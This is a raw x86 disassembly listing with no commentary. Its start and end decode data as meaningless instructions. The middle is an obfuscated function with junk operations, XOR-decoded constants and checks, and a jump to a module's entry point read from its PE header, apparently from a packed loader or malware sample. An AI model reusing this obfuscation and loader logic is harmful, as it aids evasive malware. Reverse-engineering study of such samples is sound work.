  40d6f1:	add    BYTE PTR [ebx+0x5e54638a],ch
  40d6f7:	inc    ecx
  40d6f8:	mov    ds:0xc409966a,eax
  40d6fd:	sti    
  40d6fe:	ins    DWORD PTR es:[edi],dx
  40d6ff:	popa   
  40d700:	jmp    0x5a15:0x43bb3eb3
  40d707:	dec    ecx
  40d708:	mov    eax,ds:0x510f4a48
  40d70d:	out    0xa0,al
  40d70f:	jmp    0xde656e22
  40d714:	ret    0xcc8e
  40d717:	in     al,0xf7
  40d719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d71a:	add    eax,0x108d836
  40d71f:	sub    BYTE PTR [edi+0x2],al
  40d722:	je     0x40d75f
  40d724:	mov    eax,ds:0x8e0b3859
  40d729:	add    BYTE PTR [ebp+0x44],dh
  40d72c:	mov    ebx,0x3ea08327
  40d731:	jecxz  0x40d78b
  40d733:	lahf   
  40d734:	mov    ebp,DWORD PTR [eax+0x35]
  40d737:	cli    
  40d738:	push   esi
  40d739:	adc    al,0x1
  40d73b:	jmp    0xd0ff2780
  40d740:	fcom   st(5)
  40d742:	jg     0x40d6eb
  40d744:	icebp  
  40d745:	shl    al,0xa0
  40d748:	inc    edi
  40d749:	mov    bh,0x4e
  40d74b:	mov    dh,0xc7
  40d74d:	lods   eax,DWORD PTR ss:[esi]
  40d74f:	add    esi,edi
  40d751:	popa   
  40d752:	cdq    
  40d753:	and    al,0x42
  40d755:	mov    ss,WORD PTR [ebx+0x73]
  40d758:	push   esp
  40d759:	mov    edx,0x96f1db45
  40d75e:	int3   
  40d75f:	ret    0x7f9e
  40d762:	push   cs
  40d763:	and    BYTE PTR [eax+ebp*2+0x55],bl
  40d767:	ja     0x40d71c
  40d769:	jnp    0x40d779
  40d76b:	lahf   
  40d76c:	les    edx,FWORD PTR [ebx]
  40d76e:	push   esi
  40d76f:	mov    bl,0xf4
  40d771:	mov    ah,0xff
  40d773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d774:	push   ss
  40d775:	aad    0x9b
  40d777:	in     eax,dx
  40d778:	ins    BYTE PTR es:[edi],dx
  40d779:	mov    eax,0xfbce3bbb
  40d77e:	arpl   WORD PTR [eax],ax
  40d780:	ret    0x5bb5
  40d783:	pop    ebp
  40d784:	scas   eax,DWORD PTR es:[edi]
  40d785:	repnz test BYTE PTR [ebp+ebx*8-0x53],bh
  40d78a:	lock inc eax
  40d78c:	jecxz  0x40d74b
  40d78e:	jne    0x40d78e
  40d790:	or     al,0xc3
  40d792:	cmp    dh,bl
  40d794:	ret    
  40d795:	xchg   esi,eax
  40d796:	ins    DWORD PTR es:[edi],dx
  40d797:	mov    esi,DWORD PTR [edx]
  40d799:	push   eax
  40d79a:	hlt    
  40d79b:	popf   
  40d79c:	dec    eax
  40d79d:	jecxz  0x40d806
  40d79f:	sar    al,0x96
  40d7a2:	(bad)  
  40d7a3:	in     eax,0x73
  40d7a5:	(bad)  
  40d7a6:	sbb    dh,BYTE PTR [eax+esi*4+0x4f]
  40d7aa:	lods   eax,DWORD PTR ds:[esi]
  40d7ab:	add    dh,ah
  40d7ad:	jg     0x40d793
  40d7af:	xlat   BYTE PTR ds:[ebx]
  40d7b0:	cdq    
  40d7b1:	inc    ebx
  40d7b2:	std    
  40d7b3:	xchg   esp,edx
  40d7b5:	or     al,0x6e
  40d7b7:	(bad)  
  40d7b8:	sar    dl,1
  40d7ba:	fbld   TBYTE PTR [eax+0x6f]
  40d7bd:	fbstp  TBYTE PTR [esi]
  40d7bf:	int    0x1a
  40d7c1:	mov    WORD PTR [ecx],ds
  40d7c3:	sub    dl,BYTE PTR [ebx*8-0x1696bdb9]
  40d7ca:	inc    ebx
  40d7cb:	pop    edi
  40d7cc:	stos   BYTE PTR es:[edi],al
  40d7cd:	int3   
  40d7ce:	jnp    0x40d789
  40d7d0:	test   al,0x26
  40d7d2:	push   cs
  40d7d3:	es (bad) 
  40d7d5:	in     eax,dx
  40d7d6:	jo     0x40d7c8
  40d7d8:	xchg   BYTE PTR [edx],bh
  40d7da:	push   ecx
  40d7db:	sahf   
  40d7dc:	and    al,BYTE PTR [edi+0x5621836]
  40d7e2:	xor    DWORD PTR [eax+ecx*1],esp
  40d7e5:	imul   edi,ecx,0x2a
  40d7e8:	jl     0x40d799
  40d7ea:	test   ah,0x80
  40d7ed:	out    0xe6,al
  40d7ef:	add    al,0x81
  40d7f1:	xchg   DWORD PTR [eax],ebp
  40d7f3:	lock mov eax,0x42542989
  40d7f9:	mov    ds:0x75ad04ab,eax
  40d7fe:	std    
  40d7ff:	push   cs
  40d800:	repz inc edi
  40d802:	jmp    0x5d3e:0x39f95eba
  40d809:	repnz adc ebp,DWORD PTR [ebx]
  40d80c:	sbb    eax,0xf1d75f18
  40d811:	sbb    esp,DWORD PTR [esi]
  40d813:	fsub   QWORD PTR ds:0x1ea0117d
  40d819:	sbb    al,0x49
  40d81b:	aad    0x16
  40d81d:	hlt    
  40d81e:	cli    
  40d81f:	fwait
  40d820:	bound  edi,QWORD PTR [ebx+ebx*8]
  40d823:	xchg   edx,eax
  40d824:	pusha  
  40d825:	in     eax,0xb6
  40d827:	sub    DWORD PTR [ecx],eax
  40d829:	imul   edx,ecx,0xcd9db3d8
  40d82f:	push   ds
  40d830:	mov    ecx,0x2c0541cf
  40d835:	lock jo 0x40d81c
  40d838:	inc    edx
  40d839:	jnp    0x40d7f8
  40d83b:	adc    ebp,DWORD PTR [esp+ebp*8-0x15]
  40d83f:	stc    
  40d840:	fnstenv [edi]
  40d842:	mov    cl,0xb
  40d844:	jecxz  0x40d8c5
  40d846:	and    eax,0x1e35e8ef
  40d84b:	inc    esp
  40d84c:	mov    esi,0x27998bfc
  40d851:	rol    DWORD PTR [eax-0x16a08506],1
  40d857:	je     0x40d833
  40d859:	bound  edi,QWORD PTR [edi-0x4e4cc42e]
  40d85f:	sub    al,0x38
  40d861:	outs   dx,DWORD PTR ds:[esi]
  40d863:	push   esp
  40d864:	xor    cl,BYTE PTR cs:[esi]
  40d867:	and    eax,0x6b29c074
  40d86c:	sahf   
  40d86d:	xchg   ebp,eax
  40d86e:	add    al,0x5
  40d870:	xchg   DWORD PTR [ebx],ecx
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx+0x7f6ad044]
  40e122:	pop    ss
  40e123:	pop    es
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e191
  40e12d:	jb     0x40e0fc
  40e12f:	xor    bh,BYTE PTR [esi-0x16b4a47c]
  40e135:	dec    ebp
  40e136:	into   
  40e137:	stc    
  40e138:	sub    dl,BYTE PTR [ebx]
  40e13a:	test   eax,0x9525d1a8
